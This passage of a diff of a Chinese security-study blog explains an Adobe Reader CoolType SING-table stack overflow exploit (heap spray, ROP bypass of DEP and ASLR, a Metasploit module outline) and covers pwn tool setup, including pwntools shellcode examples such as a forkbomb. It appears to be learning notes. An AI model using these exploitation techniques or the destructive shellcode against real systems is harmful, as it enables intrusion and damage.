xmlns:xdp&#x3D;&quot;http:&#x2F;&#x2F;ns.adobe.com&#x2F;xdp&#x2F;&quot;&gt;</span><br><span class="line">    &lt;config xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.xfa.org&#x2F;schema&#x2F;xci&#x2F;2.6&#x2F;&quot;&gt;</span><br><span class="line">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;&#x2F;interactive&gt;&lt;&#x2F;pdf&gt;&lt;&#x2F;present&gt;</span><br><span class="line">    &lt;&#x2F;config&gt;</span><br><span class="line">    &lt;template xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.xfa.org&#x2F;schema&#x2F;xfa-template&#x2F;2.6&#x2F;&quot;&gt;</span><br><span class="line">    &lt;subform name&#x3D;&quot;form1&quot; layout&#x3D;&quot;tb&quot; locale&#x3D;&quot;en_US&quot;&gt;</span><br><span class="line">    &lt;pageSet&gt;&lt;&#x2F;pageSet&gt;</span><br><span class="line">    &lt;&#x2F;subform&gt;&lt;&#x2F;template&gt;&lt;&#x2F;xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref    &#x2F;&#x2F;交叉引用表</span><br><span class="line">0 15    &#x2F;&#x2F;说明下面的描述是从0号对象开始，数量为15</span><br><span class="line">0000000000 65535 f  &#x2F;&#x2F;对象0的起始地址为00000000，产生号为65535，也是最大产生号，不可以再进行更改，f表示该对象状态为free</span><br><span class="line">0000000015 00000 n  &#x2F;&#x2F;对象1的起始地址为00000015，产生号为00000，全零表明该对象未被修改过，n表示该对象在使用中</span><br><span class="line">0000000139 00000 n</span><br><span class="line">0000000264 00000 n</span><br><span class="line">0000000294 00000 n</span><br><span class="line">0000000332 00000 n</span><br><span class="line">0000000469 00000 n</span><br><span class="line">0000000503 00000 n</span><br><span class="line">0000000727 00000 n</span><br><span class="line">0000000853 00000 n</span><br><span class="line">0000001016 00000 n</span><br><span class="line">0000041370 00000 n</span><br><span class="line">0000041443 00000 n</span><br><span class="line">0000045816 00000 n</span><br><span class="line">0000045853 00000 n</span><br><span class="line"></span><br><span class="line">trailer     &#x2F;&#x2F;尾部</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;Size 15        &#x2F;&#x2F;该PDF的对象数</span><br><span class="line">    &#x2F;Root 1 0 R     &#x2F;&#x2F;根对象的对象号为1</span><br><span class="line">&gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref</span><br><span class="line">46280       &#x2F;&#x2F;交叉引用表的偏移</span><br><span class="line">%%EOF       &#x2F;&#x2F;文件结束标志</span><br></pre></td></tr></table></figure>
+<p>winhex中 00001f90机器码是58</p>
+<p>rasm2 -a x86 -d 58可以看到是pop eax</p>
+<p><img src="https://i.imgur.com/Qy96sES.png"></p>
+<p>由于DEP的实施,不能直接跳到nop进行执行，需要先进行ROP使得shellcode得到执行，所以我们需要预测rop链的准确位置，由于内存分配是对齐的，这意味着如果我们用正确的大小的块，和正确的大小的喷射块，我们将确保每个喷射块开始，将在可预见的地址定位。再通过简单的计算，可以实现准确喷射。</p>
+<p> 最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p>
+<p>解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit()"></a>exploit()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def exploit</span><br><span class="line">    ttf_data &#x3D; make_ttf() # 构造ttf字体数据,SING表内容就在其中</span><br><span class="line"></span><br><span class="line">    js_data &#x3D; make_js(payload.encoded) # 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span><br><span class="line"></span><br><span class="line">    # Create the pdf</span><br><span class="line">    pdf &#x3D; make_pdf(ttf_data, js_data) # 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span><br><span class="line"></span><br><span class="line">    print_status(&quot;Creating &#39;#&#123;datastore[&#39;FILENAME&#39;]&#125;&#39; file...&quot;)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) # 创建pdf文件</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
+<h4 id="make-ttf"><a href="#make-ttf" class="headerlink" title="make_ttf()"></a>make_ttf()</h4><p>  此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。</p>
+<h4 id="make-js"><a href="#make-js" class="headerlink" title="make_js()"></a>make_js()</h4><p>  此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。</p>
+<h4 id="make-pdf"><a href="#make-pdf" class="headerlink" title="make_pdf()"></a>make_pdf()</h4><p>  此函数一步一步构造<code>pdf</code>中的每一个<code>obj</code>,将<code>ttf字体数据</code>和<code>javascript代码</code>分别放在了<code>obj10</code>和<code>obj12</code>,然后在<code>obj1</code>中设置<code>/OpenAction 11 0 R</code>,使pdf文件<code>打开</code>时,<code>javascript</code>能够被执行,从而实现<code>Heap Spary</code>。还构造了<code>obj13</code>,使<code>icucnv36.dll</code>能够被加载。因为,<code>exp</code>中使用的<code>ROPgadget</code>都是出自<code>icucnv36.dll</code>模块的,所以其必须要<code>被加载到内存</code>中。</p>
+<h3 id="TEB-PEB"><a href="#TEB-PEB" class="headerlink" title="TEB\PEB"></a>TEB\PEB</h3><p>一个可执行文件被OS加载到内存，并处理完成相关的模块加载，导入表处理……及其他必须处理后，形成一个进程。在OS内核中保存有一份关于这个进程的身份证信息，就是平常看到的HANDLE，叫进程句柄。</p>
+<p>TEB偏移0x30处是本进程的PEB结构体指针，通过这个指针即可取得PEB的地址，从而继续读取更多的关于本进程的一些信息。</p>
+<p>PEB(Process Environment Block，进程环境块)：存放进程信息，准确的PEB地址应该从系统的EXPROCESS结构的0x1b0偏移出获得，但这个结构位于系统地址空间，访问 需要 ring0权限，所以一般通过TEB结构的偏移0x30处获取PEB.</p>
+<pre><code>获取peb代码：mov eax, fs:[0x30]  
+
+     mov PEB, eax
+</code></pre>
+<p>TEB(Thread Environment Block，线程环境块)： 存放线程信息，位于用户地址空间，进程中的每个线程都有自己的一个TEB.通过fs寄存器来访问，一般储存在fs:[0].</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
-<p><img src="https://i.imgur.com/aNd8DRC.png"></p>
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/04/12/pwn-environment-layout/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="eetan">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Antinomy">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/04/12/pwn-environment-layout/" class="post-title-link" itemprop="url">pwn-environment-layout</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-04-12 17:20:31" itemprop="dateCreated datePublished" datetime="2021-04-12T17:20:31+08:00">2021-04-12</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-04-24 10:08:12" itemprop="dateModified" datetime="2021-04-24T10:08:12+08:00">2021-04-24</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="pwn环境布置"><a href="#pwn环境布置" class="headerlink" title="pwn环境布置"></a>pwn环境布置</h1><h2 id="ubuntu18-04安装："><a href="#ubuntu18-04安装：" class="headerlink" title="ubuntu18.04安装："></a>ubuntu18.04安装：</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/38797088">VMware安装Ubuntu18.04（必会） - 知乎 (zhihu.com)</a></p>
+<h2 id="给ubuntu18-04换源"><a href="#给ubuntu18-04换源" class="headerlink" title="给ubuntu18.04换源"></a>给ubuntu18.04换源</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiangxianghehe/article/details/80112149">Ubuntu 18.04换国内源 中科大源 阿里源 163源 清华源_xiangxianghehe的博客-CSDN博客</a></p>
+<p>(注意没有权限记得sudo)</p>
+<h2 id="安装编译Python源程序所需的包"><a href="#安装编译Python源程序所需的包" class="headerlink" title="安装编译Python源程序所需的包"></a>安装编译Python源程序所需的包</h2><p>sudo apt install build-essential -y<br>sudo apt install libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev -y<br>sudo apt-get install zlib1g-dev</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42261208/article/details/105227474">ubuntu18.04 pwn环境搭建_winterze的博客-CSDN博客</a></p>
+<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>sudo apt install git</p>
+<h3 id="进行git配置"><a href="#进行git配置" class="headerlink" title="进行git配置"></a>进行git配置</h3><p>sudo git config –global user.name ‘自定义用户名’<br>sudo git config –global user.email ‘邮箱’</p>
+<h2 id="Pwn常用软件（python2）"><a href="#Pwn常用软件（python2）" class="headerlink" title="Pwn常用软件（python2）"></a>Pwn常用软件（python2）</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>sudo apt-get install python python-pip python-dev libssl-dev libffi-dev build-essential</p>
+<p>sudo pip install -U setuptools</p>
+<p>sudo pip install –upgrade pip</p>
+<p>sudo pip install –upgrade pwntools</p>
+<p>测试：</p>
+<p>import pwn<br>pwn.asm(“xor eax,eax”)<br>b’1\xc0’</p>
+<p>（配置过程中遇到问题 python-tox 不匹配，用了以下命令解决<br>sudo pip install six –user -U<br>sudo pip install ipython –user -U）</p>
+<h3 id="安装gdb"><a href="#安装gdb" class="headerlink" title="安装gdb"></a>安装gdb</h3><p>sudo apt-get install gdb</p>
+<h3 id="安装pwndbg"><a href="#安装pwndbg" class="headerlink" title="安装pwndbg"></a>安装pwndbg</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a></p>
+<p> cd pwndbg </p>
+<p>sudo ./setup.sh</p>
+<h3 id="安装peda："><a href="#安装peda：" class="headerlink" title="安装peda："></a>安装peda：</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda</p>
+<p>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
+<h3 id="32位程序支持"><a href="#32位程序支持" class="headerlink" title="32位程序支持"></a>32位程序支持</h3><p>sudo apt-get install libc6-dev-i386</p>
+<h3 id="32位依赖库"><a href="#32位依赖库" class="headerlink" title="32位依赖库"></a>32位依赖库</h3><p>sudo apt-get install lib32ncurses5</p>
+<p>sudo apt-get install lib32z1</p>
+<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>git clone <a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher.git">https://github.com/lieanu/LibcSearcher.git</a> </p>
+<p>cd LibcSearcher </p>
+<p>sudo python setup.py develop</p>
+<h3 id="ROPgadget和one-gadget"><a href="#ROPgadget和one-gadget" class="headerlink" title="ROPgadget和one_gadget"></a>ROPgadget和one_gadget</h3><h4 id="安装ROPgadget："><a href="#安装ROPgadget：" class="headerlink" title="安装ROPgadget："></a>安装ROPgadget：</h4><p>sudo apt-get install python-capstone</p>
+<p>git clone <a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget.git">https://github.com/JonathanSalwan/ROPgadget.git</a></p>
+<p>cd ROPgadget</p>
+<p>sudo python setup.py install</p>
+<h4 id="安装one-gadget："><a href="#安装one-gadget：" class="headerlink" title="安装one_gadget："></a>安装one_gadget：</h4><p>sudo apt install ruby</p>
+<p>sudo gem install one_gadget</p>
+<h2 id="pwndbg介绍及常见应用"><a href="#pwndbg介绍及常见应用" class="headerlink" title="pwndbg介绍及常见应用"></a>pwndbg介绍及常见应用</h2><p>他是linux下的一款程序调试器</p>
+<h4 id="启动gdb"><a href="#启动gdb" class="headerlink" title="启动gdb"></a>启动gdb</h4><blockquote>
+<p>$ gdb 可执行程序</p>
+</blockquote>
+<h4 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h4><p>将目标程序转为汇编代码</p>
 <blockquote>
-<p>turetype文件扩展名是.ttf or .tte</p>
+<p>$ disass 函数名字或者地址</p>
+<p>如果要反汇编一个地址到另外一个地址之间的内容</p>
+<p>$ disass 地址1，地址2</p>
 </blockquote>
-<h4 id="TTF文件格式"><a href="#TTF文件格式" class="headerlink" title="TTF文件格式"></a>TTF文件格式</h4><p><code>TTF表目录头</code>结构如下：</p>
-<p><img src="https://i.imgur.com/l2Na1I0.png"></p>
-<p><img src="https://i.imgur.com/f5Oy9yo.png"></p>
-<ul>
-<li>**<code>sfnt version</code>**：0x00010000(sfnt-1.0)</li>
-<li>**<code>numTables</code>**：0x0011(Dec:17) 有17个表</li>
-<li>**<code>searchRange</code>**：0x0100</li>
-<li>**<code>entrySelector</code>**：0x0004</li>
-<li>**<code>rangeShift</code>**：0x0010</li>
-</ul>
-<p>TrueType字体中常见的表:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">head           字体头                            字体的全局信息</span><br><span class="line">cmap           字符代码到图元的映射               把字符代码映射为图元索引</span><br><span class="line">glyf           图元数据                          图元轮廓定义以及网格调整指令</span><br><span class="line">maxp           最大需求表                        字体中所需内存分配情况的汇总数据</span><br><span class="line">mmtx           水平规格                          图元水平规格</span><br><span class="line">loca           位置表索引                        把元索引转换为图元的位置</span><br><span class="line">name           命名表                            版权说明、字体名、字体族名、风格名等等</span><br><span class="line">hmtx           水平布局                          字体水平布局星系：上高、下高、行间距、最大前进宽度、最小左支撑、最小右支撑</span><br><span class="line">kerm           字距调整表                        字距调整对的数组</span><br><span class="line">post           PostScript信息                    所有图元的PostScript   FontInfo目录项和PostScript名</span><br><span class="line">PCLT           PCL5数据                          HP PCL 5Printer Language的字体信息：字体数、宽度、x高度、风格、记号集等等</span><br><span class="line">OS&#x2F;2           OS&#x2F;2和Windows特有的规格           TrueType字体所需的规格集</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="SING表结构"><a href="#SING表结构" class="headerlink" title="SING表结构"></a>SING表结构</h4><p><code>SING技术</code>是Adobe公司推出的针对<code>“外字”（Gaiji）</code>的解决方案，<code>外字</code>是<code>日语</code>中的意思，<code>中文</code>中就是<code>生僻字</code>的意思。SING允许用户创建新字形，每个新字形作为一个独立的字体打包。这样打包出来的字形称为字形包（<code>glyphlet</code>）。这种格式通过Adobe公开的，且<code>基于OpenType</code>。SING（Smart INdependent Glyphlets，智能独立字形包）的规范允许字形包随同文件一起传送，这样包含SING字符的文件也是可携带的，而又不会字符乱码、异常显示。SING表结构文档真的不好找，一篇博客中说可以在这里<a target="_blank" rel="noopener" href="https://www.adobe.com/devnet/opentype/gdk/topic.html">Adobe Glyphlet Development Kit (GDK) for SING Gaiji Architecture</a>下载到一个名叫<code>GlyDevKit.zip</code>的压缩包，压缩包中的Gaiji SING Glyphlet spec.pdf文档中记录了有关SING表的一些规范，但是，可能由于时间问题，Adobe官网已经下载不到这个压缩包了，还好有关漏洞部分的内容，他的博客中已经提到。还可以在这里找到,<a target="_blank" rel="noopener" href="https://github.com/adobe-type-tools/afdko/blob/develop/c/spot/sfnt_includes/sfnt_SING.h">Adobe Font Development Kit for OpenType</a>。</p>
-<h5 id="SING表目录项"><a href="#SING表目录项" class="headerlink" title="SING表目录项"></a>SING表目录项</h5><p><img src="https://i.imgur.com/AqVGb9c.png"></p>
-<p><img src="https://i.imgur.com/Pj9wJk2.png"></p>
-<p><code>SING表目录项</code>的定义如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct_SING</span><br><span class="line">&#123;</span><br><span class="line">    char tag[4];        &#x2F;&#x2F;标记：&quot;SING&quot;</span><br><span class="line">    ULONG checkSum;     &#x2F;&#x2F;校验和：&quot;0xD9BCC8B5&quot;</span><br><span class="line">    ULONG offset;       &#x2F;&#x2F;表偏移：&quot;0x0000011c&quot;</span><br><span class="line">    ULONG length;       &#x2F;&#x2F;数据长度：&quot;0x00001DDF&quot;</span><br><span class="line">&#125;TableEntry;</span><br><span class="line">&#x2F;&#x2F;TrueType字体中的所有数据都使用big-endian编码，最高位字节在最前面（因为TrueType字体最初是由apple公司定义的，而apple公司的os运行在motorola的cpu上）。</span><br></pre></td></tr></table></figure>
-<p>53 49 4E 47 表示ASCII的“SING”,也就是它的tag[4];接下来分别是检验和、表偏移、数据长度。</p>
-<h5 id="SING表内容的数据结构"><a href="#SING表内容的数据结构" class="headerlink" title="SING表内容的数据结构"></a>SING表内容的数据结构</h5><p>如下图所示：</p>
-<p><img src="https://i.imgur.com/aEB94lV.png"></p>
-<p>8*2==16</p>
-<p>从0x11c开始数16个字节就到了uniqueName，<code>CoolType</code>库对<code>SING表</code>的解析代码，当<code>uniqueName</code>字段为超长字符串时，执行<code>strcat()</code>前未对其长度进行检测，执行<code>strcat()</code>后，会将该字段复制到固定大小的栈空间，最终<code>导致栈溢出</code>。</p>
-<p>看图从3A后的内容也就是从F1起会被复制到固定大小的栈空间。</p>
-<p><img src="https://i.imgur.com/ANEsXb1.png"></p>
-<h3 id="静态分析cooltype-dll漏洞文件"><a href="#静态分析cooltype-dll漏洞文件" class="headerlink" title="静态分析cooltype.dll漏洞文件"></a>静态分析cooltype.dll漏洞文件</h3><p>ida64分析此文件，查找字符串“aSing”</p>
-<p>SHIFT+F12—&gt;search SING</p>
-<p>ctrl+t找到SING，双击进入点击aString[],Ctrl+x查看<code>交叉引用</code></p>
-<p>双击这条就可以定位到解析存在漏洞的地方。</p>
-<p><img src="https://i.imgur.com/9RIXlVQ.png"></p>
-<p><img src="https://i.imgur.com/iErE9j9.png"></p>
-<p><img src="https://i.imgur.com/ur9VJgy.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add     eax,10h                        ；相对于SING表偏移处0x10处找到uniqueName。</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push    eax                            ; char *,strcat源地址入栈，也就是uniqueName起始地址</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+108h+var_108]        ; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span><br><span class="line">push    eax                            ; char *,strcat目的地址入栈</span><br><span class="line">mov     [ebp+108h+var_108], 0          ; 将目标字符串赋值为NULL,空字符串</span><br><span class="line">call    strcat                         ; 调用strcat函数，造成溢出</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<h4 id="下断点和删除断点"><a href="#下断点和删除断点" class="headerlink" title="下断点和删除断点"></a>下断点和删除断点</h4><p>b *地址 or b 函数名字</p>
+<p>删除断点：delete 1就是删除第一个断点</p>
+<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>r </p>
+<h4 id="继续执行"><a href="#继续执行" class="headerlink" title="继续执行"></a>继续执行</h4><p>s: 执行一行源程序代码，如果此行代码中有函数调用，则进入该函数；<br>n: 执行一行源程序代码，此行代码中的函数调用也一并执行。<br>s 相当于其它调试器中的“Step Into (单步跟踪进入)”；<br>n 相当于其它调试器中的“Step Over (单步跟踪)”。</p>
+<h4 id="查看栈空间"><a href="#查看栈空间" class="headerlink" title="查看栈空间"></a>查看栈空间</h4><p>x/20xw 地址   显示20个单元，16进制，4字节每单元</p>
+<blockquote>
+<p>h=2 bytes,w=4 bytes,g=8 bytes.</p>
+</blockquote>
+<h4 id="查看堆空间"><a href="#查看堆空间" class="headerlink" title="查看堆空间"></a>查看堆空间</h4><p>x/32gx  堆地址</p>
+<blockquote>
+<p><strong>h=2 bytes,w=4 bytes,g=8 bytes.</strong></p>
+</blockquote>
+<p>格式：x/&lt;n/f/u&gt; <addr></p>
+<p>整合这个命令的诠释：就是以addr为起始地址，返回n个单元的值，每个单元对应u个字节，输出格式是f。</p>
+<p>n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。</p>
+<p>f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</p>
+<p>x 按十六进制格式显示变量。</p>
+<p>d 按十进制格式显示变量。</p>
+<p>u 按十六进制格式显示无符号整型。</p>
+<p>o 按八进制格式显示变量。</p>
+<p>t 按二进制格式显示变量。</p>
+<p>a 按十六进制格式显示变量。</p>
+<p>c 按字符格式显示变量。</p>
+<p>f 按浮点数格式显示变量。</p>
+<p>u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes.<br><addr>:表示内存地址。</p>
+<p><img src="https://i.imgur.com/lVsP3IX.png"></p>
+<h4 id="查看程序内存结构"><a href="#查看程序内存结构" class="headerlink" title="查看程序内存结构"></a>查看程序内存结构</h4><p>vmmap</p>
+<p><img src="https://i.imgur.com/SlGTNMF.png"></p>
+<h3 id="pwntools-1"><a href="#pwntools-1" class="headerlink" title="pwntools"></a>pwntools</h3><h4 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h4><p>from pwn import *<br>io = remote(“127.0.0.1”, 32152)<br>#与互联网主机交互<br>io.sendline(“hello”)<br>io.send(“hello”)<br>#sendline发送数据会在最后多添加一个回车<br>io.recv(1024)<br>io.revuntil()<br>io.recvline(“hello”)<br>#recv()读取1024个字节，recvline()会读取一直到回车，recvuntil()读取到指定数据<br>io.interactive()</p>
+<p>io = process(“./bin”, shell=True)<br>#启动本地程序进行交互，用于gdb调试</p>
+<p>io.interactive()<br>io.p32(0xdeadbeef)<br>io.p64(0xdeadbeefdeadbeef)</p>
+<blockquote>
+<p>p64 和 p32 则分别转换 8 bit 和 4 bit 数字</p>
+</blockquote>
+<p>io.u32(“1234”)<br>io.u64(“12345678”)</p>
+<p>将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</p>
+<p>shellcraft&amp;asm<br>pwntools的shellcraft主要用来生成汇编代码形式的shellcode,而asm的作用是根据汇编代码编译出二进制shellcode。</p>
+<p>#生成执行sh的shellcode并编译<br>asm(pwnlib.shellcraft.thumb.linux.sh(), arch=”thumb”)<br>#可以将thumb换成对应cpu</p>
+<p>#读取flag并输出到标准输出<br>pwnlib.shellcraft.i386.linux.cat(“flag”, fd=1)</p>
+<p>#使用forkbomb破坏系统（慎用）<br>pwnlib.shellcraft.i386.linux.forkbomb()</p>
+<p>context<br>context.log_level = “debug”<br>context.arch = “amd64”</p>
+<blockquote>
+<p>设置成debug，pwntools会将所有io数据等输出，方便编写poc的时候进行调试，而arch可以设置攻击目标的指令构架。</p>
+</blockquote>
+<p>ELF<br>用于读取elf文件中的各种结构数据。例如plt，got，函数地址等等。</p>
+<p><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools — pwntools 4.3.1 documentation</a></p>
 
       
     </div>
@@ -706,7 +815,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-03-30 18:52:06" itemprop="dateModified" datetime="2021-03-30T18:52:06+08:00">2021-03-30</time>
+        <time title="Modified: 2021-04-17 21:15:03" itemprop="dateModified" datetime="2021-04-17T21:15:03+08:00">2021-04-17</time>
       </span>
 
   
@@ -750,6 +859,10 @@
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yeholmes/article/details/106454289">GDB内存调试初探二_yeholmes的专栏-CSDN博客</a>   </p>
 <h2 id="IDA-版本下载"><a href="#IDA-版本下载" class="headerlink" title="IDA 版本下载"></a>IDA 版本下载</h2><p><a target="_blank" rel="noopener" href="https://down.52pojie.cn/?query=ida">爱盘 - 最新的在线破解工具包 (52pojie.cn)</a></p>
 <h2 id="ACM-ICPC培训资料汇编-2-基本数据结构与算法分册"><a href="#ACM-ICPC培训资料汇编-2-基本数据结构与算法分册" class="headerlink" title="ACM-ICPC培训资料汇编(2)基本数据结构与算法分册"></a>ACM-ICPC培训资料汇编(2)基本数据结构与算法分册</h2><p><a target="_blank" rel="noopener" href="http://www.doc88.com/p-3059640614423.html">ACM-ICPC培训资料汇编(2)基本数据结构与算法分册 - 道客巴巴 (doc88.com)</a></p>
+<h2 id="堆利用方法"><a href="#堆利用方法" class="headerlink" title="堆利用方法"></a>堆利用方法</h2><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>
+<h2 id="汇编和机器码的转换"><a href="#汇编和机器码的转换" class="headerlink" title="汇编和机器码的转换"></a>汇编和机器码的转换</h2><p>radare</p>
+<p>rasm2 -L    #查看architectures<br>rasm2 -a x86 -b 32 ‘mov eax, 33’    #转机器码<br>echo ‘push eax;nop;nop’ | rasm2 -f -   </p>
+<p>rasm2 -a x86 -d 55  #转汇编 push ebp</p>
 
       
     </div>
@@ -1193,136 +1306,6 @@
 <p>./hex2raw &lt;level22.txt | ./bufbomb -u eetan</p>
 </blockquote>
 <p><img src="https://img-blog.csdnimg.cn/20210216203214990.png" alt="在这里插入图片描述"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://xiaosolll.github.io/2021/02/14/attacklab/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="eetan">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Antinomy">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/02/14/attacklab/" class="post-title-link" itemprop="url">Untitled</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
